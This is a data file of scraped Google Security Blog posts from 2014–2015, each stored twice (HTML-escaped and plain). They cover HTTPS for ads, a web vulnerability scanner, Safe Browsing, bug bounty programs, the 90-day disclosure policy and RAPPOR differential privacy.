{"website": "Google-Security", "title": "\nAds Take a Step Towards “HTTPS Everywhere”\n", "author": ["Posted by ", "Neal Mohan, VP Product Management, Display and Video Ads", "Jerry Dischler, VP Product Management, AdWords"], "link": "https://security.googleblog.com/2015/04/ads-take-step-towards-https-everywhere.html", "abstract": "                             Posted by&nbsp;    Neal Mohan, VP Product Management, Display and Video Ads    Jerry Dischler, VP Product Management, AdWords       Since  2008  we&#8217;ve been working to make sure all of our services use strong  HTTPS encryption  by default. That means people using products like Search, Gmail, YouTube, and Drive will automatically have an encrypted connection to Google. In addition to providing a secure connection on our own products, we&#8217;ve been big proponents of the idea of &#8220; HTTPS Everywhere ,&#8221; encouraging webmasters to  prevent   and   fix security breaches  on their sites, and using  HTTPS as a signal in our search ranking algorithm .    This year, we&#8217;re working to bring this &#8220;HTTPS Everywhere&#8221; mission to our ads products as well, to support all of our advertiser and publisher partners. Here are some of the specific initiatives we&#8217;re working on:       We&#8217;ve moved all YouTube ads to HTTPS as of the end of 2014.   Search on Google.com is  already encrypted  for a vast majority of users and we are working towards encrypting search ads across our systems.   By June 30, 2015, the vast majority of mobile, video, and desktop display ads served to the Google Display Network, AdMob, and DoubleClick publishers will be encrypted.   Also by June 30, 2015, advertisers using any of our buying platforms, including AdWords and DoubleClick, will be able to serve HTTPS-encrypted display ads to all HTTPS-enabled inventory.      Of course we&#8217;re not alone in this goal. By encrypting ads, the advertising industry can help make the internet a little safer for all users. Recently, the Interactive Advertising Bureau (IAB) published  a call to action to adopt HTTPS  ads, and many industry players are also working to meet HTTPS requirements. We&#8217;re big supporters of these industry-wide efforts to make HTTPS everywhere a reality.    Our HTTPS Everywhere ads initiatives will join some of our other efforts to provide a great ads experience online for our users, like &#8220; Why this Ad? &#8221;, &#8220; Mute This Ad &#8221; and  TrueView  skippable ads. With these security changes to our ads systems, we&#8217;re one step closer to ensuring users everywhere are safe and secure every time they choose to watch a video, map out a trip in a new city, or open their favorite app.                                   Posted by  Neal Mohan, VP Product Management, Display and Video Ads Jerry Dischler, VP Product Management, AdWords  Since 2008 we’ve been working to make sure all of our services use strong HTTPS encryption by default. That means people using products like Search, Gmail, YouTube, and Drive will automatically have an encrypted connection to Google. In addition to providing a secure connection on our own products, we’ve been big proponents of the idea of “HTTPS Everywhere,” encouraging webmasters to prevent and fix security breaches on their sites, and using HTTPS as a signal in our search ranking algorithm.  This year, we’re working to bring this “HTTPS Everywhere” mission to our ads products as well, to support all of our advertiser and publisher partners. Here are some of the specific initiatives we’re working on:   We’ve moved all YouTube ads to HTTPS as of the end of 2014. Search on Google.com is already encrypted for a vast majority of users and we are working towards encrypting search ads across our systems. By June 30, 2015, the vast majority of mobile, video, and desktop display ads served to the Google Display Network, AdMob, and DoubleClick publishers will be encrypted. Also by June 30, 2015, advertisers using any of our buying platforms, including AdWords and DoubleClick, will be able to serve HTTPS-encrypted display ads to all HTTPS-enabled inventory.   Of course we’re not alone in this goal. By encrypting ads, the advertising industry can help make the internet a little safer for all users. Recently, the Interactive Advertising Bureau (IAB) published a call to action to adopt HTTPS ads, and many industry players are also working to meet HTTPS requirements. We’re big supporters of these industry-wide efforts to make HTTPS everywhere a reality.  Our HTTPS Everywhere ads initiatives will join some of our other efforts to provide a great ads experience online for our users, like “Why this Ad?”, “Mute This Ad” and TrueView skippable ads. With these security changes to our ads systems, we’re one step closer to ensuring users everywhere are safe and secure every time they choose to watch a video, map out a trip in a new city, or open their favorite app.     ", "date": "April 17, 2015"},
{"website": "Google-Security", "title": "\nUsing Google Cloud Platform for Security Scanning\n", "author": ["Posted by Rob Mann, Security Engineering Manager"], "link": "https://security.googleblog.com/2015/02/using-google-cloud-platform-for.html", "abstract": "                             Posted by Rob Mann, Security Engineering Manager      [Cross-posted from the  Google Cloud Platform Blog ]     Deploying a new build is a thrill, but every release should be scanned for security vulnerabilities. And while web application security scanners have existed for years, they&#8217;re not always well-suited for Google App Engine developers. They&#8217;re often difficult to set up, prone to over-reporting issues (false positives)&#8212;which can be time-consuming to filter and triage&#8212;and built for security professionals, not developers.    Today, we&#8217;re releasing Google Cloud Security Scanner in beta. If you&#8217;re using App Engine, you can easily scan your application for two very common vulnerabilities: cross-site scripting (XSS) and mixed content.    While designing Cloud Security Scanner we had three goals:     Make the tool easy to set up and use   Detect the most common issues App Engine developers face with minimal false positives   Support scanning rich, JavaScript-heavy web applications    To try it for yourself, select  Compute &gt; App Engine &gt; Security scans  in the Google  Developers Console  to run your first scan, or  learn more here .                   So How Does It Work?         Crawling and testing modern HTML5, JavaScript-heavy applications with rich multi-step user interfaces is considerably more challenging than scanning a basic HTML page. There are two general approaches to this problem:       Parse the HTML and emulate a browser. This is fast, however, it comes at the cost of missing site actions that require a full DOM or complex JavaScript operations.   Use a real browser. This approach avoids the parser coverage gap and most closely simulates the site experience. However, it can be slow due to event firing, dynamic execution, and time needed for the DOM to settle.        Cloud Security Scanner addresses the weaknesses of both approaches by using a multi-stage pipeline. First, the scanner makes a high speed pass, crawling, and parsing the HTML. It then executes a slow and thorough full-page render to find the more complex sections of your site.         While faster than a real browser crawl, this process is still too slow. So we scale horizontally. Using  Google Compute Engine , we dynamically create a botnet of hundreds of virtual Chrome workers to scan your site. Don&#8217;t worry, each scan is limited to 20 requests per second or lower.         Then we attack your site (again, don&#8217;t worry)! When testing for XSS, we use a completely benign payload that relies on  Chrome DevTools  to execute the debugger. Once the debugger fires, we know we have JavaScript code execution, so false positives are (almost) non-existent. While this approach comes at the cost of missing some bugs due to application specifics, we think that most developers will appreciate a low effort, low noise experience when checking for security issues&#8212;we know Google developers do!         As with all dynamic vulnerability scanners, a clean scan does not necessarily mean you&#8217;re security bug free. We still recommend a manual security review by your friendly web app security professional.         Ready to get started?  Learn more here . Cloud Security Scanner is currently in beta with many more features to come, and we&#8217;d love to hear your feedback. Simply click the &#8220;Feedback&#8221; button directly within the tool.                                       Posted by Rob Mann, Security Engineering Manager  [Cross-posted from the Google Cloud Platform Blog]  Deploying a new build is a thrill, but every release should be scanned for security vulnerabilities. And while web application security scanners have existed for years, they’re not always well-suited for Google App Engine developers. They’re often difficult to set up, prone to over-reporting issues (false positives)—which can be time-consuming to filter and triage—and built for security professionals, not developers.  Today, we’re releasing Google Cloud Security Scanner in beta. If you’re using App Engine, you can easily scan your application for two very common vulnerabilities: cross-site scripting (XSS) and mixed content.  While designing Cloud Security Scanner we had three goals:  Make the tool easy to set up and use Detect the most common issues App Engine developers face with minimal false positives Support scanning rich, JavaScript-heavy web applications  To try it for yourself, select Compute > App Engine > Security scans in the Google Developers Console to run your first scan, or learn more here.       So How Does It Work?    Crawling and testing modern HTML5, JavaScript-heavy applications with rich multi-step user interfaces is considerably more challenging than scanning a basic HTML page. There are two general approaches to this problem:   Parse the HTML and emulate a browser. This is fast, however, it comes at the cost of missing site actions that require a full DOM or complex JavaScript operations. Use a real browser. This approach avoids the parser coverage gap and most closely simulates the site experience. However, it can be slow due to event firing, dynamic execution, and time needed for the DOM to settle.    Cloud Security Scanner addresses the weaknesses of both approaches by using a multi-stage pipeline. First, the scanner makes a high speed pass, crawling, and parsing the HTML. It then executes a slow and thorough full-page render to find the more complex sections of your site.    While faster than a real browser crawl, this process is still too slow. So we scale horizontally. Using Google Compute Engine, we dynamically create a botnet of hundreds of virtual Chrome workers to scan your site. Don’t worry, each scan is limited to 20 requests per second or lower.    Then we attack your site (again, don’t worry)! When testing for XSS, we use a completely benign payload that relies on Chrome DevTools to execute the debugger. Once the debugger fires, we know we have JavaScript code execution, so false positives are (almost) non-existent. While this approach comes at the cost of missing some bugs due to application specifics, we think that most developers will appreciate a low effort, low noise experience when checking for security issues—we know Google developers do!    As with all dynamic vulnerability scanners, a clean scan does not necessarily mean you’re security bug free. We still recommend a manual security review by your friendly web app security professional.    Ready to get started? Learn more here. Cloud Security Scanner is currently in beta with many more features to come, and we’d love to hear your feedback. Simply click the “Feedback” button directly within the tool.      ", "date": "February 19, 2015"},
{"website": "Google-Security", "title": "\nMore Protection from Unwanted Software\n", "author": ["Posted by Lucas Ballard, Software Engineer"], "link": "https://security.googleblog.com/2015/02/more-protection-from-unwanted-software.html", "abstract": "                             Posted by Lucas Ballard, Software Engineer           SafeBrowsing helps keep you safe online and includes protection against  unwanted software  that makes undesirable changes to your computer or interferes with your online experience.    We recently expanded our efforts in Chrome, Search, and ads to keep you even safer from sites where these nefarious downloads are available.      Chrome  : Now, in addition to showing warnings   before you download unwanted software  , Chrome will show you a new warning, like the one below, before you visit a site that encourages downloads of unwanted software.                      Search  : Google Search now incorporates signals that identify such deceptive sites.  This change reduces the chances you&#8217;ll visit these sites via our search results.     Ads  : We    recently  began to disable Google ads that lead to sites with unwanted software.          If you&#8217;re a site owner, we recommend that you register your site with   Google Webmaster Tools  . This will help you stay informed when we find something on your site that leads people to download  unwanted software , and will provide you with helpful tips to resolve such issues.&nbsp;             We&#8217;re constantly working to keep people safe across the web.   Read more about Safe Browsing technology and our work to protect users&nbsp;  here  .                                      Posted by Lucas Ballard, Software Engineer    SafeBrowsing helps keep you safe online and includes protection against unwanted software that makes undesirable changes to your computer or interferes with your online experience.  We recently expanded our efforts in Chrome, Search, and ads to keep you even safer from sites where these nefarious downloads are available.  Chrome: Now, in addition to showing warnings before you download unwanted software, Chrome will show you a new warning, like the one below, before you visit a site that encourages downloads of unwanted software.       Search: Google Search now incorporates signals that identify such deceptive sites.  This change reduces the chances you’ll visit these sites via our search results. Ads: We recently began to disable Google ads that lead to sites with unwanted software.   If you’re a site owner, we recommend that you register your site with Google Webmaster Tools. This will help you stay informed when we find something on your site that leads people to download unwanted software, and will provide you with helpful tips to resolve such issues.     We’re constantly working to keep people safe across the web. Read more about Safe Browsing technology and our work to protect users here.     ", "date": "February 23, 2015"},
{"website": "Google-Security", "title": "\nSafe Browsing and Google Analytics: Keeping More Users Safe, Together\n", "author": ["Posted by Stephan Somogyi, Product Manager, Security and Privacy", "If you run a web site, you may already be familiar with ", " and how it lets you know if Safe Browsing finds something problematic on your site. For example, we’ll notify you if your site is delivering malware, which is usually a sign that it’s been hacked. We’re extending our Safe Browsing protections to automatically display notifications to all Google Analytics users via familiar ", ".", " has been protecting people across the Internet for over eight years and we're always looking for ways to extend that protection even further. Notifications like these help webmasters like you act quickly to respond to any issues. Fast response helps keep your site—and your visitors—safe."], "link": "https://security.googleblog.com/2015/02/safe-browsing-and-google-analytics.html", "abstract": "                             Posted by Stephan Somogyi, Product Manager, Security and Privacy         [Cross-posted on the  Google Analytics Blog ]         If you run a web site, you may already be familiar with  Google Webmaster Tools  and how it lets you know if Safe Browsing finds something problematic on your site. For example, we&#8217;ll notify you if your site is delivering malware, which is usually a sign that it&#8217;s been hacked. We&#8217;re extending our Safe Browsing protections to automatically display notifications to all Google Analytics users via familiar  Google Analytics Notifications .                Google Safe Browsing  has been protecting people across the Internet for over eight years and we're always looking for ways to extend that protection even further. Notifications like these help webmasters like you act quickly to respond to any issues. Fast response helps keep your site&#8212;and your visitors&#8212;safe.                                    Posted by Stephan Somogyi, Product Manager, Security and Privacy  [Cross-posted on the Google Analytics Blog]  If you run a web site, you may already be familiar with Google Webmaster Tools and how it lets you know if Safe Browsing finds something problematic on your site. For example, we’ll notify you if your site is delivering malware, which is usually a sign that it’s been hacked. We’re extending our Safe Browsing protections to automatically display notifications to all Google Analytics users via familiar Google Analytics Notifications.   Google Safe Browsing has been protecting people across the Internet for over eight years and we're always looking for ways to extend that protection even further. Notifications like these help webmasters like you act quickly to respond to any issues. Fast response helps keep your site—and your visitors—safe.     ", "date": "February 26, 2015"},
{"website": "Google-Security", "title": "\nPwnium V: the never-ending* Pwnium\n", "author": ["Posted by Tim Willis, Hacker Philanthropist, Chrome Security Team"], "link": "https://security.googleblog.com/2015/02/pwnium-v-never-ending-pwnium.html", "abstract": "                             Posted by Tim Willis, Hacker Philanthropist, Chrome Security Team      [Cross-posted from the  Chromium Blog ]     Around this time each year we announce the rules, details and maximum cash amounts we&#8217;re putting up for our  Pwnium competition . For the last few years we put a huge pile of cash on the table (last year it was   e  million ) and gave researchers one day during  CanSecWest  to present their exploits. We&#8217;ve received some great entries over the years, but it&#8217;s time for something bigger.    Starting today, Pwnium will change its scope significantly, from a single-day competition held once a year at a security conference to a year round, worldwide opportunity for security researchers.    For those who are interested in what this means for the Pwnium rewards pool, we crunched the numbers and the results are in: it now goes all the way up to $&#8734; million*.    We&#8217;re making this change for a few reasons:        Removing barriers to entry:  At Pwnium competitions, a security researcher would need to have a  bug chain  in March, pre-register, have a physical presence at the competition location and hopefully get a good timeslot. Under the new scheme, security researchers can submit their bugs year-round through the  Chrome Vulnerability Reward Program (VRP)  whenever they find them.&nbsp;    Removing the incentive for bug hoarding:  If a security researcher was to discover a Pwnium-quality bug chain today, it&#8217;s highly likely that they would wait until the contest to report it to get a cash reward. This is a bad scenario for all parties. It&#8217;s bad for us because the bug doesn&#8217;t get fixed immediately and our users are left at risk. It&#8217;s bad for them as they run the real risk of a bug collision. By allowing security researchers to submit bugs all year-round, collisions are significantly less likely and security researchers aren&#8217;t duplicating their efforts on the same bugs.    Our researchers want this:  On top of all of these reasons, we asked our handful of participants if they wanted an option to report all year. They did, so we&#8217;re delivering.      Logistically, we&#8217;ll be adding Pwnium-style bug chains on Chrome OS to the  Chrome VRP . This will increase our top reward to $50,000, which will be on offer all year-round. Check out our  FAQ  for more information.    Happy hunting!    *Our lawyercats wouldn&#8217;t let me say &#8220;never-ending&#8221; or &#8220;infinity million&#8221; without adding that &#8220;this is an experimental and discretionary rewards program and Google may cancel or modify the program at any time.&#8221; Check out the reward eligibility requirements on the  Chrome VRP page .                                   Posted by Tim Willis, Hacker Philanthropist, Chrome Security Team  [Cross-posted from the Chromium Blog]  Around this time each year we announce the rules, details and maximum cash amounts we’re putting up for our Pwnium competition. For the last few years we put a huge pile of cash on the table (last year it was e million) and gave researchers one day during CanSecWest to present their exploits. We’ve received some great entries over the years, but it’s time for something bigger.  Starting today, Pwnium will change its scope significantly, from a single-day competition held once a year at a security conference to a year round, worldwide opportunity for security researchers.  For those who are interested in what this means for the Pwnium rewards pool, we crunched the numbers and the results are in: it now goes all the way up to $∞ million*.  We’re making this change for a few reasons:   Removing barriers to entry: At Pwnium competitions, a security researcher would need to have a bug chain in March, pre-register, have a physical presence at the competition location and hopefully get a good timeslot. Under the new scheme, security researchers can submit their bugs year-round through the Chrome Vulnerability Reward Program (VRP) whenever they find them.  Removing the incentive for bug hoarding: If a security researcher was to discover a Pwnium-quality bug chain today, it’s highly likely that they would wait until the contest to report it to get a cash reward. This is a bad scenario for all parties. It’s bad for us because the bug doesn’t get fixed immediately and our users are left at risk. It’s bad for them as they run the real risk of a bug collision. By allowing security researchers to submit bugs all year-round, collisions are significantly less likely and security researchers aren’t duplicating their efforts on the same bugs. Our researchers want this: On top of all of these reasons, we asked our handful of participants if they wanted an option to report all year. They did, so we’re delivering.   Logistically, we’ll be adding Pwnium-style bug chains on Chrome OS to the Chrome VRP. This will increase our top reward to $50,000, which will be on offer all year-round. Check out our FAQ for more information.  Happy hunting!  *Our lawyercats wouldn’t let me say “never-ending” or “infinity million” without adding that “this is an experimental and discretionary rewards program and Google may cancel or modify the program at any time.” Check out the reward eligibility requirements on the Chrome VRP page.     ", "date": "February 24, 2015"},
{"website": "Google-Security", "title": "\nSecurity Reward Programs: Year in Review, Year in Preview\n", "author": ["Posted by Eduardo Vela Nava, Security Engineer "], "link": "https://security.googleblog.com/2015/01/security-reward-programs-year-in-review.html", "abstract": "                             Posted by Eduardo Vela Nava, Security Engineer&nbsp;     Since 2010, our  Security Reward Programs  have been a cornerstone of our relationship with the security research community.  These programs have been successful because of two core beliefs:       Security researchers should be rewarded for helping us protect Google's users.&nbsp;   Researchers help us understand how to make Google safer by discovering, disclosing, and helping fix vulnerabilities at a scale that&#8217;s difficult to replicate by any other means.      We&#8217;re grateful for the terrific work these researchers do to help keep users safe.  And so, we wanted to take a look back at 2014 to celebrate their contributions to Google, and in turn, our contributions back to them.     Looking back on 2014     Our Security Reward Programs continue to grow at a rapid clip.  We&#8217;ve now paid more than $4,000,000 in rewards to security researchers since 2010 across all of our reward programs, and we&#8217;re looking forward to more great years to come.    In  2014 :     We paid researchers more than $1,500,000.   Our largest single reward was $150,000. The researcher then  joined us  for an internship.   We rewarded more than 200 different researchers.&nbsp;   We rewarded more than 500 bugs. For Chrome, more than half of all rewarded reports for 2014 were in developer and beta versions. We were able to squash bugs before they could reach our main user population.&nbsp;               The top three contributors to the VRP program in 2014 during a recent visit to Google Zurich:&nbsp;Adrian (Romania), Tomasz (Poland / UK), Nikolai (Ukraine)       What&#8217;s new for 2015     We are announcing two additions to our programs today.    First, researchers' efforts through these programs, combined with our own internal security work, make it increasingly difficult to find bugs. Of course, that's good news, but it can also be discouraging when researchers invest their time and struggle to find issues.    With this in mind, today we're rolling out a new, experimental program: Vulnerability Research Grants. These are up-front awards that we will provide to researchers before they ever submit a bug.    Here&#8217;s how the program works:     We'll publish different types of vulnerabilities, products and services for which we want to support research beyond our normal vulnerability rewards.&nbsp;   We'll award grants immediately before research begins, with no strings attached.  Researchers then pursue the research they applied for, as usual.   There will be various tiers of grants, with a maximum of  $3,133.70  USD.   On top of the grant, researchers are still eligible for regular rewards for the bugs they discover.&nbsp;    To learn more about the current grants, and review your eligibility, have a look at our  rules page .    Second, also starting today, all mobile applications officially developed by Google on  Google Play  and  iTunes  will now be within the scope of the  Vulnerability Reward Program .    We&#8217;re looking forward to continuing our close partnership with the security community and rewarding them for their time and efforts in 2015!                                   Posted by Eduardo Vela Nava, Security Engineer   Since 2010, our Security Reward Programs have been a cornerstone of our relationship with the security research community.  These programs have been successful because of two core beliefs:   Security researchers should be rewarded for helping us protect Google's users.  Researchers help us understand how to make Google safer by discovering, disclosing, and helping fix vulnerabilities at a scale that’s difficult to replicate by any other means.   We’re grateful for the terrific work these researchers do to help keep users safe.  And so, we wanted to take a look back at 2014 to celebrate their contributions to Google, and in turn, our contributions back to them.  Looking back on 2014  Our Security Reward Programs continue to grow at a rapid clip.  We’ve now paid more than $4,000,000 in rewards to security researchers since 2010 across all of our reward programs, and we’re looking forward to more great years to come.  In 2014:  We paid researchers more than $1,500,000. Our largest single reward was $150,000. The researcher then joined us for an internship. We rewarded more than 200 different researchers.  We rewarded more than 500 bugs. For Chrome, more than half of all rewarded reports for 2014 were in developer and beta versions. We were able to squash bugs before they could reach our main user population.     The top three contributors to the VRP program in 2014 during a recent visit to Google Zurich: Adrian (Romania), Tomasz (Poland / UK), Nikolai (Ukraine)  What’s new for 2015  We are announcing two additions to our programs today.  First, researchers' efforts through these programs, combined with our own internal security work, make it increasingly difficult to find bugs. Of course, that's good news, but it can also be discouraging when researchers invest their time and struggle to find issues.    With this in mind, today we're rolling out a new, experimental program: Vulnerability Research Grants. These are up-front awards that we will provide to researchers before they ever submit a bug.  Here’s how the program works:  We'll publish different types of vulnerabilities, products and services for which we want to support research beyond our normal vulnerability rewards.  We'll award grants immediately before research begins, with no strings attached.  Researchers then pursue the research they applied for, as usual. There will be various tiers of grants, with a maximum of $3,133.70 USD. On top of the grant, researchers are still eligible for regular rewards for the bugs they discover.   To learn more about the current grants, and review your eligibility, have a look at our rules page.  Second, also starting today, all mobile applications officially developed by Google on Google Play and iTunes will now be within the scope of the Vulnerability Reward Program.  We’re looking forward to continuing our close partnership with the security community and rewarding them for their time and efforts in 2015!     ", "date": "January 30, 2015"},
{"website": "Google-Security", "title": "\nFeedback and data-driven updates to Google’s disclosure policy\n", "author": [], "link": "https://security.googleblog.com/2015/02/feedback-and-data-driven-updates-to.html", "abstract": "                             Posted by Chris Evans and Ben Hawkes,  Project Zero ; Heather Adkins, Matt Moore and Michal Zalewski, Google Security; Gerhard Eschelbeck, Vice President, Google Security         Cross-posted from the  Project Zero blog           Disclosure deadlines have long been an industry standard practice. They improve end-user security by getting security patches to users faster. As noted in  CERT&#8217;s 45-day disclosure policy , they also &#8220;balance the need of the public to be informed of security vulnerabilities with vendors' need for time to respond effectively&#8221;.  Yahoo!&#8217;s 90-day policy  notes that &#8220;Time is of the essence when we discover these types of issues: the more quickly we address the risks, the less harm an attack can cause&#8221;.  ZDI&#8217;s 120-day policy  notes that releasing vulnerability details can &#8220;enable the defensive community to protect the user&#8221;.  Deadlines also acknowledge an uncomfortable fact that is alluded to by some of the above policies: the offensive security community invests considerably more into vulnerability research than the defensive community. Therefore, when we find a vulnerability in a high profile target, it is often already known by advanced and stealthy actors.   Project Zero  has adhered to a 90-day disclosure deadline. Now we are applying this approach for the rest of Google as well. We notify vendors of vulnerabilities immediately, with details shared in public with the defensive community after 90 days, or sooner if the vendor releases a fix. We&#8217;ve chosen a middle-of-the-road deadline timeline and feel it&#8217;s reasonably calibrated for the current state of the industry.  To see how things are going, we crunched some data on Project Zero&#8217;s disclosures to date. For example, the Adobe Flash team probably has the largest install base and number of build combinations of any of the products we&#8217;ve researched so far. To date, they have  fixed 37 Project Zero vulnerabilities  (or 100%) within the 90-day deadline. More generally, of 154 Project Zero bugs fixed so far, 85% were fixed within 90 days. Restrict this to the 73 issues filed and fixed after Oct 1st, 2014, and 95% were fixed within 90 days. Furthermore, recent  well-discussed   deadline   misses  were typically fixed very quickly after 90 days. Looking ahead, we&#8217;re not going to have any deadline misses for at least the rest of February.  Deadlines appear to be working to improve patch times and end user security&#8212;especially when enforced consistently.  We&#8217;ve studied the above data and taken on board some great debate and external feedback around some of the corner cases for disclosure deadlines. We have improved the policy in the following ways:     Weekends and holidays.  If a deadline is due to expire on a weekend or US public holiday, the deadline will be moved to the next normal work day.&nbsp;    Grace period.  We now have a 14-day grace period. If a 90-day deadline will expire but a vendor lets us know before the deadline that a patch is scheduled for release on a specific day within 14 days following the deadline, the public disclosure will be delayed until the availability of the patch. Public disclosure of an unpatched issue now only occurs if a deadline will be significantly missed (2 weeks+).&nbsp;    Assignment of CVEs.  CVEs are an industry standard for uniquely identifying vulnerabilities. To avoid confusion, it&#8217;s important that the first public mention of a vulnerability should include a CVE. For vulnerabilities that go past deadline, we&#8217;ll ensure that a CVE has been pre-assigned.&nbsp;             As always, we reserve the right to bring deadlines forwards or backwards based on extreme circumstances. We remain committed to treating all vendors strictly equally. Google expects to be held to the same standard; in fact, Project Zero has bugs in the pipeline for Google products (Chrome and Android) and these are subject to the same deadline policy.         Putting everything together, we believe the policy updates are still strongly in line with our desire to improve industry response times to security bugs, but will result in softer landings for bugs marginally over deadline. Finally, we&#8217;d like to call on all researchers to adopt disclosure deadlines in some form, and feel free to use our policy verbatim if you find our data and reasoning compelling. We&#8217;re excited by the early results that disclosure deadlines are delivering&#8212;and with the help of the broader community, we can achieve even more.                                      Posted by Chris Evans and Ben Hawkes, Project Zero; Heather Adkins, Matt Moore and Michal Zalewski, Google Security; Gerhard Eschelbeck, Vice President, Google Security   Cross-posted from the Project Zero blog    Disclosure deadlines have long been an industry standard practice. They improve end-user security by getting security patches to users faster. As noted in CERT’s 45-day disclosure policy, they also “balance the need of the public to be informed of security vulnerabilities with vendors' need for time to respond effectively”. Yahoo!’s 90-day policy notes that “Time is of the essence when we discover these types of issues: the more quickly we address the risks, the less harm an attack can cause”. ZDI’s 120-day policy notes that releasing vulnerability details can “enable the defensive community to protect the user”.Deadlines also acknowledge an uncomfortable fact that is alluded to by some of the above policies: the offensive security community invests considerably more into vulnerability research than the defensive community. Therefore, when we find a vulnerability in a high profile target, it is often already known by advanced and stealthy actors.Project Zero has adhered to a 90-day disclosure deadline. Now we are applying this approach for the rest of Google as well. We notify vendors of vulnerabilities immediately, with details shared in public with the defensive community after 90 days, or sooner if the vendor releases a fix. We’ve chosen a middle-of-the-road deadline timeline and feel it’s reasonably calibrated for the current state of the industry.To see how things are going, we crunched some data on Project Zero’s disclosures to date. For example, the Adobe Flash team probably has the largest install base and number of build combinations of any of the products we’ve researched so far. To date, they have fixed 37 Project Zero vulnerabilities (or 100%) within the 90-day deadline. More generally, of 154 Project Zero bugs fixed so far, 85% were fixed within 90 days. Restrict this to the 73 issues filed and fixed after Oct 1st, 2014, and 95% were fixed within 90 days. Furthermore, recent well-discussed deadline misses were typically fixed very quickly after 90 days. Looking ahead, we’re not going to have any deadline misses for at least the rest of February.Deadlines appear to be working to improve patch times and end user security—especially when enforced consistently.We’ve studied the above data and taken on board some great debate and external feedback around some of the corner cases for disclosure deadlines. We have improved the policy in the following ways: Weekends and holidays. If a deadline is due to expire on a weekend or US public holiday, the deadline will be moved to the next normal work day.  Grace period. We now have a 14-day grace period. If a 90-day deadline will expire but a vendor lets us know before the deadline that a patch is scheduled for release on a specific day within 14 days following the deadline, the public disclosure will be delayed until the availability of the patch. Public disclosure of an unpatched issue now only occurs if a deadline will be significantly missed (2 weeks+).  Assignment of CVEs. CVEs are an industry standard for uniquely identifying vulnerabilities. To avoid confusion, it’s important that the first public mention of a vulnerability should include a CVE. For vulnerabilities that go past deadline, we’ll ensure that a CVE has been pre-assigned.       As always, we reserve the right to bring deadlines forwards or backwards based on extreme circumstances. We remain committed to treating all vendors strictly equally. Google expects to be held to the same standard; in fact, Project Zero has bugs in the pipeline for Google products (Chrome and Android) and these are subject to the same deadline policy.    Putting everything together, we believe the policy updates are still strongly in line with our desire to improve industry response times to security bugs, but will result in softer landings for bugs marginally over deadline. Finally, we’d like to call on all researchers to adopt disclosure deadlines in some form, and feel free to use our policy verbatim if you find our data and reasoning compelling. We’re excited by the early results that disclosure deadlines are delivering—and with the help of the broader community, we can achieve even more.     ", "date": "February 13, 2015"},
{"website": "Google-Security", "title": "\nLearning statistics with privacy, aided by the flip of a coin\n", "author": [], "link": "https://security.googleblog.com/2014/10/learning-statistics-with-privacy-aided.html", "abstract": "                               Cross-posted on the  Research Blog  and the  Chromium Blog         At Google, we are constantly trying to improve the techniques we use to  protect our users' security and privacy . One such project, RAPPOR (Randomized Aggregatable Privacy-Preserving Ordinal Response), provides a new state-of-the-art, privacy-preserving way to learn software statistics that we can use to better safeguard our users&#8217; security, find bugs, and improve the overall user experience.  Building on the concept of  randomized response , RAPPOR enables learning statistics about the behavior of users&#8217; software while guaranteeing client privacy. The guarantees of  differential privacy , which are widely accepted as being the  strongest form of privacy , have almost never been used in practice despite  intense research in academia . RAPPOR introduces a practical method to achieve those guarantees.  To understand RAPPOR, consider the following example. Let&#8217;s say you wanted to count how many of your online friends were dogs, while respecting the maxim that,  on the Internet, nobody should know you&#8217;re a dog . To do this, you could ask each friend to answer the question &#8220;Are you a dog?&#8221; in the following way. Each friend should flip a coin in secret, and answer the question truthfully if the coin came up heads; but, if the coin came up tails, that friend should always say &#8220;Yes&#8221; regardless. Then you could get a good estimate of the true count from the greater-than-half fraction of your friends that answered &#8220;Yes&#8221;. However, you still wouldn&#8217;t know which of your friends was a dog: each answer &#8220;Yes&#8221; would most likely be due to that friend&#8217;s coin flip coming up tails.  RAPPOR builds on the above concept, allowing software to send reports that are effectively indistinguishable from the results of random coin flips and are free of any unique identifiers. However, by aggregating the reports we can learn the common statistics that are shared by many users. We&#8217;re currently testing the use of RAPPOR in Chrome, to learn statistics about how  unwanted software  is  hijacking  users&#8217; settings.  We believe that RAPPOR has the potential to be applied for a number of different purposes, so we're making it freely available for all to use. We'll continue development of RAPPOR as a standalone  open-source project  so that anybody can inspect test its reporting and analysis mechanisms, and help develop the technology. We&#8217;ve written up the technical details of RAPPOR in a  report  that will be published next week at the  ACM Conference on Computer and Communications Security .   We&#8217;re encouraged by the  feedback  we&#8217;ve received so far from academics and other stakeholders, and we&#8217;re looking forward to additional comments from the community. We hope that everybody interested in preserving user privacy will review the technology and share their feedback at  rappor-discuss@googlegroups.com .   Posted by Úlfar Erlingsson, Tech Lead Manager, Security Research                                     Cross-posted on the Research Blog and the Chromium Blog   At Google, we are constantly trying to improve the techniques we use to protect our users' security and privacy. One such project, RAPPOR (Randomized Aggregatable Privacy-Preserving Ordinal Response), provides a new state-of-the-art, privacy-preserving way to learn software statistics that we can use to better safeguard our users’ security, find bugs, and improve the overall user experience.Building on the concept of randomized response, RAPPOR enables learning statistics about the behavior of users’ software while guaranteeing client privacy. The guarantees of differential privacy, which are widely accepted as being the strongest form of privacy, have almost never been used in practice despite intense research in academia. RAPPOR introduces a practical method to achieve those guarantees.To understand RAPPOR, consider the following example. Let’s say you wanted to count how many of your online friends were dogs, while respecting the maxim that, on the Internet, nobody should know you’re a dog. To do this, you could ask each friend to answer the question “Are you a dog?” in the following way. Each friend should flip a coin in secret, and answer the question truthfully if the coin came up heads; but, if the coin came up tails, that friend should always say “Yes” regardless. Then you could get a good estimate of the true count from the greater-than-half fraction of your friends that answered “Yes”. However, you still wouldn’t know which of your friends was a dog: each answer “Yes” would most likely be due to that friend’s coin flip coming up tails.RAPPOR builds on the above concept, allowing software to send reports that are effectively indistinguishable from the results of random coin flips and are free of any unique identifiers. However, by aggregating the reports we can learn the common statistics that are shared by many users. We’re currently testing the use of RAPPOR in Chrome, to learn statistics about how unwanted software is hijacking users’ settings.We believe that RAPPOR has the potential to be applied for a number of different purposes, so we're making it freely available for all to use. We'll continue development of RAPPOR as a standalone open-source project so that anybody can inspect test its reporting and analysis mechanisms, and help develop the technology. We’ve written up the technical details of RAPPOR in a report that will be published next week at the ACM Conference on Computer and Communications Security. We’re encouraged by the feedback we’ve received so far from academics and other stakeholders, and we’re looking forward to additional comments from the community. We hope that everybody interested in preserving user privacy will review the technology and share their feedback at rappor-discuss@googlegroups.com.Posted by Úlfar Erlingsson, Tech Lead Manager, Security Research     ", "date": "October 30, 2014"},
